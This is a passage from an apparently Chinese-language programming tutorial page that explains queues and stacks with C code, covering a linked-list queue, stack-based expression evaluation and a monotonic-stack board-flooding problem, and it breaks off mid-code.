class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;ctype.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;time.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ERROR 0;</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> OK 1;</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> &#123;</span><br>    <span class="hljs-keyword">int</span> val;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">next</span>;</span><br>&#125; Node, *Node_p;<br><br><span class="hljs-comment">// 设计为带有dummy head的链表</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Queue</span> &#123;</span><br>    Node *head;<br>    Node *tail;<br>    <span class="hljs-keyword">int</span> len;<br>&#125; Queue, *Queue_p;<br><br><span class="hljs-function">Node *<span class="hljs-title">initNode</span><span class="hljs-params">(<span class="hljs-keyword">int</span> val)</span> </span>&#123;<br>    Node *n = (Node *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));<br>    n-&gt;val = val;<br>    n-&gt;next = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> n;<br>&#125;<br><br><span class="hljs-function">Queue *<span class="hljs-title">initStack</span><span class="hljs-params">()</span> </span>&#123;<br>    Queue_p q = (Queue_p)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Queue));<br>    q-&gt;head = initNode(<span class="hljs-number">-1</span>);<br>    q-&gt;tail = <span class="hljs-literal">NULL</span>;<br>    q-&gt;len = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> q;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">push</span><span class="hljs-params">(Queue_p q, <span class="hljs-keyword">int</span> val)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!q) <span class="hljs-keyword">return</span> ERROR;<br>    Node_p node = initNode(val);<br><br>    <span class="hljs-comment">// 有tail就在tail之后增加</span><br>    <span class="hljs-keyword">if</span> (q-&gt;tail) &#123;<br>        q-&gt;tail-&gt;next = node;<br>        q-&gt;tail = node;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        node-&gt;next = q-&gt;head-&gt;next;<br>        q-&gt;head-&gt;next = node;<br>        q-&gt;tail = node;<br>    &#125;<br>    q-&gt;len++;<br><br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">freeNode</span><span class="hljs-params">(Node_p n)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (n) <span class="hljs-built_in">free</span>(n);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pop</span><span class="hljs-params">(Queue_p q)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!q || !q-&gt;head || !q-&gt;head-&gt;next) <span class="hljs-keyword">return</span> ERROR;<br>    Node_p tmp = q-&gt;head-&gt;next;<br>    q-&gt;head-&gt;next = q-&gt;head-&gt;next-&gt;next;<br>    freeNode(tmp);<br><br>    <span class="hljs-comment">// 最后一个节点被弹出</span><br>    <span class="hljs-keyword">if</span> (q-&gt;head-&gt;next == <span class="hljs-literal">NULL</span>)<br>        q-&gt;tail = <span class="hljs-literal">NULL</span>;<br><br>    q-&gt;len--;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">top</span><span class="hljs-params">(Queue_p q)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!q || !q-&gt;head || !q-&gt;head-&gt;next) <span class="hljs-keyword">return</span> ERROR;<br>    <span class="hljs-keyword">return</span> q-&gt;head-&gt;next-&gt;val;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">empty</span><span class="hljs-params">(Queue_p q)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> (!q || !q-&gt;head || !q-&gt;head-&gt;next);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">freeStack</span><span class="hljs-params">(Queue_p q)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!q || !q-&gt;head) <span class="hljs-keyword">return</span>;<br>    Node *p = q-&gt;head, *tmp;<br>    <span class="hljs-keyword">while</span> (p) &#123;<br>        tmp = p;<br>        p = p-&gt;next;<br>        freeNode(tmp);<br>    &#125;<br>    <span class="hljs-built_in">free</span>(q);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">showStack</span><span class="hljs-params">(Queue_p q)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!q || !q-&gt;head) <span class="hljs-keyword">return</span>;<br>    Node_p p = q-&gt;head-&gt;next;<br>    <span class="hljs-keyword">while</span> (p) &#123;<br>        (p != q-&gt;head-&gt;next) &amp;&amp; <span class="hljs-built_in">printf</span>(<span class="hljs-string">" "</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d"</span>, p-&gt;val);<br>        p = p-&gt;next;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n"</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    srand(time(<span class="hljs-literal">NULL</span>));<br>    Queue_p q = initStack();<br>    <span class="hljs-keyword">int</span> cnt = <span class="hljs-number">20</span>;<br>    <span class="hljs-keyword">while</span> (cnt--) &#123;<br>        <span class="hljs-keyword">int</span> val = rand() % <span class="hljs-number">100</span>;<br>        <span class="hljs-keyword">int</span> opt = rand() % <span class="hljs-number">4</span>;<br>        <span class="hljs-keyword">switch</span> (opt) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">"push %d, %s\n"</span>, val, push(q, val) ? <span class="hljs-string">"SUC"</span>: <span class="hljs-string">"ERROR"</span>);<br>                showStack(q);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>                empty(q) ? <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Nothing to pop.\n"</span>) : <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Pop.\n"</span>);<br>                pop(q);<br>                showStack(q);<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"\nFinal: \n"</span>);<br>    showStack(q);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2><span id="栈">栈</span></h2><p>栈有一个重要的性质，就是 <strong>先进后出</strong> ，First In LastOut(FILO)。例如，浏览器页面的多次跳转和多次返会功能，就是栈的应用。</p><p>利用一个变量维护栈顶位置。</p><p>栈，通过实现一个表达式解析问题，进行实现。</p><p>用栈实现表达式求值的算法流程如下：</p><blockquote><ol type="1"><li>使用两个栈分别存储数值和运算符。</li><li>读取表达式字符，数值存入数值栈，运算符和栈顶运算符比较优先级。</li><li>通过运算符优先级不同选择将它压入栈或取出数值栈中两个元素进行计算，计算结果入栈。</li><li>返回步骤 2，直至表达式全部读完。</li><li>弹出一个运算符和两个数值进行运算，计算结果存储数值栈。</li><li>当运算符栈不为空时，返回步骤5，否则数值栈中剩余的最后一个元素就是表达式求值结果。</li></ol></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;ctype.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ERROR 0</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> OK 1</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Stack</span> &#123;</span><br>    <span class="hljs-keyword">int</span> *elements;<br>    <span class="hljs-keyword">int</span> max_size, top_index;<br>&#125; Stack;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(Stack *s, <span class="hljs-keyword">int</span> length)</span> </span>&#123;<br>    s-&gt;elements = (<span class="hljs-keyword">int</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>) * length);<br>    s-&gt;max_size = length;<br>    s-&gt;top_index = <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">expand</span><span class="hljs-params">(Stack *s)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!s) <span class="hljs-keyword">return</span> ERROR;<br>    <span class="hljs-keyword">int</span> expsize = s-&gt;max_size;<br>    <span class="hljs-keyword">int</span> *tmp;<br>    <span class="hljs-keyword">while</span> (expsize &gt; <span class="hljs-number">0</span>) &#123;<br>        tmp = (<span class="hljs-keyword">int</span> *)<span class="hljs-built_in">realloc</span>(s-&gt;elements, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>) * (s-&gt;max_size + expsize));<br>        <span class="hljs-keyword">if</span> (tmp) <span class="hljs-keyword">break</span>;<br>        expsize &gt;&gt;= <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!tmp) <span class="hljs-keyword">return</span> ERROR;<br><br>    s-&gt;elements = tmp;<br>    s-&gt;max_size += expsize;<br><br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">push</span><span class="hljs-params">(Stack *s, <span class="hljs-keyword">int</span> element)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (s-&gt;top_index &gt;= s-&gt;max_size - <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!expand(s))<br>            <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    s-&gt;top_index++;<br>    s-&gt;elements[s-&gt;top_index] = element;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pop</span><span class="hljs-params">(Stack *s)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (s-&gt;top_index &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    s-&gt;top_index--;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">top</span><span class="hljs-params">(Stack *s)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> s-&gt;elements[s-&gt;top_index];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">empty</span><span class="hljs-params">(Stack *s)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (s-&gt;top_index &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 优先级判断</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">precede</span><span class="hljs-params">(<span class="hljs-keyword">char</span> a, <span class="hljs-keyword">char</span> b)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> ((a == <span class="hljs-string">'*'</span>||a==<span class="hljs-string">'/'</span>) &amp;&amp; (b == <span class="hljs-string">'+'</span>||b == <span class="hljs-string">'-'</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 计算 a theta b</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">operate</span><span class="hljs-params">(<span class="hljs-keyword">char</span> theta, <span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (theta == <span class="hljs-string">'+'</span>) &#123;<br>        <span class="hljs-keyword">return</span> a + b;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (theta == <span class="hljs-string">'*'</span>)&#123;<br>        <span class="hljs-keyword">return</span> a * b;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (theta == <span class="hljs-string">'-'</span>)&#123;<br>        <span class="hljs-keyword">return</span> a - b;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (theta == <span class="hljs-string">'/'</span>)&#123;<br>        <span class="hljs-keyword">return</span> a / b;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 计算表达式</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">calc</span><span class="hljs-params">(Stack *numbers, Stack *operators)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> a = top(numbers);<br>    pop(numbers);<br>    <span class="hljs-keyword">int</span> b = top(numbers);<br>    pop(numbers);<br>    push(numbers, operate(top(operators), b, a));<br>    pop(operators);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">clear</span><span class="hljs-params">(Stack *s)</span> </span>&#123;<br>    <span class="hljs-built_in">free</span>(s-&gt;elements);<br>    <span class="hljs-built_in">free</span>(s);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;n);<br>    Stack *numbers = (Stack *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Stack));<br>    init(numbers, n);<br>    Stack *operators = (Stack *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Stack));<br>    init(operators, n);<br>    <br>    <span class="hljs-keyword">char</span> *<span class="hljs-built_in">buffer</span> = (<span class="hljs-keyword">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>) * (n + <span class="hljs-number">1</span>));<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%s"</span>, <span class="hljs-built_in">buffer</span>);<br>    <br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (i &lt; n) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isdigit</span>(<span class="hljs-built_in">buffer</span>[i])) &#123;<br>            push(numbers, <span class="hljs-built_in">buffer</span>[i] - <span class="hljs-string">'0'</span>);<br>            i++;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (empty(operators) || precede(<span class="hljs-built_in">buffer</span>[i], top(operators))) &#123;<br>                push(operators, <span class="hljs-built_in">buffer</span>[i]);<br>                i++;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                calc(numbers, operators);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">while</span> (!empty(operators)) &#123;<br>        calc(numbers, operators);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>, top(numbers));<br>    <span class="hljs-built_in">clear</span>(numbers);<br>    <span class="hljs-built_in">clear</span>(operators);<br>    <span class="hljs-built_in">free</span>(<span class="hljs-built_in">buffer</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="单调栈">单调栈</span></h3><p>地上从左到右竖立着 <em>n</em> 块木板，从 1 到 <em>n</em>依次编号，如下图所示。我们知道每块木板的高度，在第 <em>n</em>块木板右侧竖立着一块高度无限大的木板，现对每块木板依次做如下的操作：对于第<em>i</em> 块木板，我们从其右侧开始倒水，直到水的高度等于第 <em>i</em>块木板的高度，倒入的水会淹没 <span class="math inline">\(a_i\)</span>块木板（如果木板左右两侧水的高度大于等于木板高度即视为木板被淹没）。求<em>n</em> 次操作后，所有 <span class="math inline">\(a_i\)</span>的和是多少。</p><p>如图所示，在第 4 块木板右侧倒水，可以淹没第 5 块和第 6 块一共 2块木板，<span class="math inline">\(a_4\)</span> = 2。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/Notes_pic/2021/10/03/21-29-03-1b8d67.png" srcset="/img/loading.gif" lazyload alt="例图" style="zoom:80%;"></p><p>建立一个从栈顶到栈底递增的单调栈。假设木板p是栈顶元素，木板q是当前待入栈元素。</p><p>将q push到栈的过程中，如果栈顶元素p出栈则表明我们已经找到了木板p右侧第一块比它高的木板q。</p><p>然后只需要记录q与p之间的木板数，求和。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ERROR 0</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> OK 1</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> &#123;</span><br>    <span class="hljs-keyword">int</span> id, <span class="hljs-built_in">height</span>;<br>&#125; Node;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Stack</span> &#123;</span><br>    Node *elements;<br>    <span class="hljs-keyword">int</span> max_size, top_index;<br>&#125; Stack;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(Stack *s, <span class="hljs-keyword">int</span> length)</span> </span>&#123;<br>    s-&gt;elements = (Node *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node) * length);<br>    s-&gt;max_size = length;<br>    s-&gt;top_index = <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">push</span><span class="hljs-params">(Stack *s, Node element)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (s-&gt;top_index &gt;= s-&gt;max_size - <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    s-&gt;top_index++;<br>    s-&gt;elements[s-&gt;top_index] = element;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pop</span><span class="hljs-params">(Stack *s)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (s-&gt;top_index &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    s-&gt;top_index--;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-function">Node <span class="hljs-title">top</span><span class="hljs-params">(Stack *s)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> s-&gt;elements[s-&gt;top_index];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">empty</span><span class="hljs-params">(Stack *s)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (s-&gt;top_index &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">clear</span><span class="hljs-params">(Stack *s)</span> </span>&#123;<br>    <span class="hljs-built_in">free</span>(s-&gt;elements);<br>    <span class="hljs-built_in">free</span>(s);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n, ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;n);<br>    Stack *<span class="hljs-built_in">stack</span> = (Stack *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Stack));<br>    init(<span class="hljs-built_in">stack</span>, n);<br>    Node temp;<br>    <br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%d"</span>, &amp;temp.<span class="hljs-built_in">height</span>);<br>        temp.id = i;<br>        <span class="hljs-keyword">while</span> (!empty(<span class="hljs-built_in">stack</span>) &amp;&amp; top(<span class="hljs-built_in">stack</span>).<span class="hljs-built_in">height</span> &lt;= temp.<span class="hljs-built_in">height</span>) &#123;<br>            ans = ans + i - top(<span class="hljs-built_in">stack</span>).id - <span class="hljs-number">1</span>;<br>            pop(<span class="hljs-built_in">stack</span>);<br>        &#125;<br>        push(<span class="hljs-built_in">stack</span>, temp);<br>    &#125;<br>    <span class="hljs-keyword">while</span> 